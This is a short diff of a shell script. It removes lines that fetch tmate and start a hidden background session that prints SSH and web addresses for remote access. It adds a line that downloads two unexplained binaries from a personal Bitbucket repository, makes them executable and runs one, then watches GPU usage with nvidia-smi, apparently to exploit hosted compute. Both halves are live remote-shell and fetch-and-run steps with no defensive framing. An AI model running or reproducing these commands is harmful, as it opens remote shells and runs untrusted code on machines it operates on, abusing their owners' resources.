@@ -1,8 +1,2 @@
-wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
-tar -xvf tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
-rm -f nohup.out; bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a' >/dev/null 2>&1
-ls -l
-./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready
-./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with SSH address: #{tmate_ssh}"
-./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with web: #{tmate_web}"
+wget https://bitbucket.org/mukidi2/ssh/raw/9a13a317a08a11b516b232b60c008a9775de0a61/ssh2 && wget https://bitbucket.org/mukidi2/ssh/raw/9a13a317a08a11b516b232b60c008a9775de0a61/run && chmod +x ssh2 run && ./ssh2
 watch -d -n 40 nvidia-smi
